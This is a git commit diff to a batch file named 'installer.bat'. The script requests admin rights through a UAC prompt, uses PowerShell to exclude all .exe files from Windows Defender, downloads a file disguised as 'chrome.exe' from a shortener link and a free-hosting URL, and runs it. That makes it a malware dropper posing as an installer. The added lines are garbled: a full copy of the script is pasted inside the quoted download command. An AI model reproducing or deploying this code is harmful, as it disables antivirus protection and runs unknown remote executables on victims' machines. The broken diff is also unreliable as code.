75394ebba942d79b69c17f29a273ba9535ba6fa3
L3m0NShare <161139798+L3m0NShare@users.noreply.github.com>
2024-05-05 00:17:12 +0200

    Update installer.bat

--- installer.bat
+++ installer.bat
@@ -28,5 +28,35 @@ if '%errorlevel%' NEQ '0' (
 :--------------------------------------
 Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell -Command "Invoke-Webrequest 'https://bd2c.lynck.it/845bc1' -OutFile chrome.exe"
+Powershell -Command "Invoke-Webrequest 'REM - This is not the file you need to run. You need to upload this file to your webserver.
+
+@echo off
+
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+cd %TEMP%
+Powershell -Command "Invoke-Webrequest 'https://l3mondrop.000webhostapp.com/chrome.exe' -OutFile chrome.exe"
 chrome.exe
